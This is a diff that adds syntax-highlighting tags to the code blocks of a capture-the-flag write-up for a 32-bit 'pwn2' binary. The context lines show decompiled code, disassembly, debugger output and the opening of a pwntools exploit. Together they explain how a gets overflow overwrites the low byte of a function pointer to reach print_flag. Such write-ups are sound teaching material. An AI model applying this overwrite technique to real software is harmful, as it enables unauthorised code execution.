@@ -4,7 +4,7 @@ The goal of this challenge is to get the challenge to print the contents of `fla
 
 Let's take a look at the binary:
 
-```
+```console
 $    file pwn2
 pwn2: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c3936da4c051f1ca58585ee8b243bc9c4a37e437, not stripped
 $    pwn checksec pwn2
@@ -25,7 +25,7 @@ So we can see that we are dealing with a `32` bit binary, with Relro, NX, and PI
 
 When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -44,7 +44,7 @@ undefined4 main(void)
 
 So we can see that it calls `gets` to scan in data into `input` (so we have one buffer overflow bug there). Before returning it passes our input to the `select_func` function:
 
-```
+```c
 
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -70,7 +70,7 @@ So we can see here, it makes an indirect call of the instruction pointer stored 
 
 Also one other thing, a bit of the disassembly here is wrong. Specifically where `functionCall` is initialized to be the address of `two`. When we look at the assembly code, we see that it happens before the `strncpy` call:
 
-```
+```nasm
         00010791 8d 83 f5        LEA        EAX,[0xffffe6f5 + EBX]=>two
                  e6 ff ff
         00010797 89 45 f4        MOV        dword ptr [EBP + functionCall],EAX=>two
@@ -85,7 +85,7 @@ Also one other thing, a bit of the disassembly here is wrong. Specifically where
 
 Also we can see that if we can call the function `print_flag` at offset `0x6d8`, we get the flag.
 
-```
+```c
 
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -111,7 +111,7 @@ void print_flag(void)
 
 So we have a one byte overflow for the least significant byte of the function pointer that is called. Let's take a closer look at the address we are calling, and the address of `print_flag`:
 
-```
+```gdb
 gef➤  pie b *0x7d4
 gef➤  pie run
 Stopped due to shared library event (no libraries added or removed)
@@ -201,7 +201,7 @@ So we can see that we were able to overwrite the least significant byte with `0x
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 from pwn import *
 
 # Declare the target
@@ -217,7 +217,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './pwn2': pid 11453
 [*] Switching to interactive mode
